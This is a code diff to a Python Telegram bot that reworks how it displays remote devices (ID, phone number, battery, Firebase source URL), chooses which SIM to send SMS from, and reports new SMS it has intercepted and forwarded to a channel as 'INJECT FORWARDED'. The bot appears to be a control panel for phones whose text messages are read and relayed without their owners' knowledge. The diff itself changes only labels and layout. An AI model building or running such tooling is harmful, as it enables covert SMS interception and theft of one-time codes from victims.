@@ -141,6 +141,17 @@ def get_model_name(device: Device) -> str:
     return meta.get("model") or meta.get("device_model") or "Unknown"
 
 
+def _sim_button_label(sim: dict) -> str:
+    slot = sim.get("slot", 1)
+    number = sim.get("number", "Unknown")
+    carrier = (sim.get("carrier") or "").strip()
+    if _is_valid_sim_number(number) and carrier and carrier.upper() not in {f"SIM {slot}", "SIM 1", "SIM 2"}:
+        return f"📶 SIM {slot}: {carrier} ({number})"
+    if _is_valid_sim_number(number):
+        return f"📶 SIM {slot} ({number})"
+    return f"📶 SIM {slot}"
+
+
 def format_device_set_card(
     device: Device,
     selected_sim: int = 0,
@@ -148,31 +159,28 @@ def format_device_set_card(
     found_ms: int | None = None,
     status: str = "online",
 ) -> str:
-    sims = get_sim_list(device)
-    active = sims[selected_sim] if sims else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}
     device_short = short_device_id(device.name)
     db_url = device.firebase_source_url or "Not linked"
-    timing = f"\nFound in {found_ms}ms" if found_ms is not None else ""
-    status_icon = "🟢" if status == "online" else "🟡"
+    phone = device.phone_number or "Unknown"
+    timing = f" ⚡ Found in {found_ms}ms" if found_ms is not None else ""
+    if status == "online":
+        status_line = "🟢 Online"
+    elif status == "offline":
+        status_line = "🔴 Offline"
+    else:
+        status_line = "🟡 Idle"
 
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Device Found &amp; Set!\n\n"
-        f"📱 ID: {device_short}\n"
-        f"📦 Model: {get_model_name(device)}\n"
-        f"🔋 Battery: {get_battery(device)}\n"
-        f"{status_icon} Status: {status.title()}\n"
-        f"🔥 DB: {db_url}"
-        f"{timing}\n\n"
-        "⚠️ Previous monitoring was AUTO-STOPPED.\n"
-        "Use /startmonitor again when ready.\n\n"
-        "Select SIM to send FROM:"
-        "</pre>\n"
-        + "".join(
-            f"\n📶 SIM {sim.get('slot', idx + 1)}: {sim.get('number', 'Unknown')}"
-            for idx, sim in enumerate(get_active_sims(device))
-        )
+        f"📱 {device_short}\n"
+        f"📞 {phone}\n"
+        f"🔋 {get_battery(device)}\n"
+        f"{status_line}\n"
+        f"🗄️ DB: {db_url}\n\n"
+        f"Select SIM to send FROM:{timing}"
+        "</pre>"
     )
 
 
@@ -180,7 +188,7 @@ def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
     rows = [
         [
             InlineKeyboardButton(
-                f"📶 SIM {sim['slot']} ({sim.get('number', 'Unknown')})",
+                _sim_button_label(sim),
                 callback_data=f"sim:{device.id}:{sim['index']}",
             )
         ]
@@ -205,15 +213,34 @@ def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
 
 def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
     active = get_selected_sim(device, sim_index)
+    slot = active.get("slot", 1)
+    number = active.get("number", "Unknown")
+    carrier = active.get("carrier") or f"SIM {slot}"
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
-        f"📶 Selected: SIM {active.get('slot', 1)} ({active.get('number', 'Unknown')})"
-        "</pre>\n\n"
-        "Tap <b>Monitoring ON</b> to start\n"
-        "Pehle <code>/mynum</code> + <code>/addchannel</code> set karo\n\n"
-        f"Channel SMS → SIM {active.get('slot', 1)} se jayega"
+        f"📱 {short_device_id(device.name)}\n"
+        f"🔋 {get_battery(device)}\n"
+        f"📶 Active SIM: SIM {slot} (Index {sim_index})\n"
+        f"📞 FROM Number: {number}\n"
+        f"SIM {slot}: {carrier} ({number})\n\n"
+        "Select SIM Slot for sending SMS:"
+        "</pre>"
+    )
+
+
+def sim_confirm_keyboard(device: Device, sim_index: int) -> InlineKeyboardMarkup:
+    active = get_selected_sim(device, sim_index)
+    return InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton(
+                    _sim_button_label(active),
+                    callback_data=f"sim:confirm:{device.id}:{sim_index}",
+                )
+            ],
+            [InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop")],
+        ]
     )
 
 
@@ -232,7 +259,7 @@ def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "⚡ INJECT FORWARDED! [STARTUP]\n\n"
-        f"📤 Sender: {STARTUP_TEST_SENDER}\n"
+        f"📩 Sender: {STARTUP_TEST_SENDER}\n"
         f"🔒 {STARTUP_TEST_MESSAGE}\n\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
@@ -252,7 +279,7 @@ def format_virtus_stream_card(
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "⚡ INJECT FORWARDED! [STREAM]\n\n"
-        f"📤 Sender: {sender}\n"
+        f"📩 Sender: {sender}\n"
         f"🔒 {body}\n\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
@@ -339,8 +366,7 @@ def format_monitoring_card(
         f"📢 Channel: {channel} (last / addchannel only)\n"
         f"⏱ Auto-stop in {auto_stop} minutes\n"
         f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
-        f"✅ Test SMS sent: {test_msg}\n"
-        f"(SIM {sim_slot} se /mynum par — recharge nahi to SMS nahi jayega)"
+        f"✅ Test inject OK: {test_msg}"
         "</pre>"
     )
 
